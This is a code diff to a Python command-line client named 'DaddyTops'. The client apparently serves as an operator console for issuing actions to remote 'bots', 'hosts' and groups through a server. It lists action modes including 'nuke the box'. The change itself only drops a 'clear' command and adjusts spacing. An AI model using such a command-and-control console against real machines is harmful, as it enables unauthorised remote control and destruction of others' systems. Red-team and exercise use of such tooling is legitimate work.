@@ -15,7 +15,7 @@ from shutil import get_terminal_size
 
 server = os.environ.get("DT_SERVER", "http://localhost:8888") 
 user = os.environ.get("DT_USER", "Unknown")
-dtWords = ["action:", "gaction:", "groups", "actions", "show:", "result:", "hosts", "bots", "modes", "help", "exit", "groupmembers", "clear"]
+dtWords = ["action:", "gaction:", "groups", "actions", "show:", "result:", "hosts", "bots", "modes", "help", "exit", "groupmembers"]
 dtComp = WordCompleter(dtWords)
 print(" =================")
 print("| DaddyTops Login |")
@@ -34,9 +34,11 @@ def handleNew(split_inp):
     print(split_inp)
     return
 
+
 def handleShow(split_inp):
     print(split_inp)
     return
+
 
 def handleInput(args):
     if args.startswith("action:"):
@@ -49,13 +51,12 @@ def handleInput(args):
         help()
     elif args.startswith("exit"):
         exit()
-    elif args.startswith("clear"):
-        clearterm()
     elif args == "":
         return
     else:
         print("USAGE ERROR: use `help` for options")
     return
+
 
 def help():
     print("Daddy Tops Command Line Tool")
@@ -73,6 +74,7 @@ def help():
     print("                           -table options: 'bots', 'hosts', 'actions', 'groups', 'groupmembers', 'db'")
     print()
     return
+
 
 def newAction(args):
     try:
@@ -105,6 +107,7 @@ def newAction(args):
         print(request.text)
     return
 
+
 def newGroupAction(args):
     try:
         args = args.split(":", 3)
@@ -136,6 +139,7 @@ def newGroupAction(args):
         print(request.text)
     return
 
+
 def showModes():
     print("  AVAILABLE ACTION MODES:")
     print("  OPCODE   MODE                            Args")
@@ -148,6 +152,7 @@ def showModes():
     print("  F        nuke the box                    N/A")
     print()
     return
+
 
 def listObj(args):
     if args == "show: modes":
@@ -185,6 +190,7 @@ def listObj(args):
         res = base64.b64decode(encRes).decode("utf-8")
         print(res)
         return
+
 
 while True:
     user_input = prompt('DT> ', 
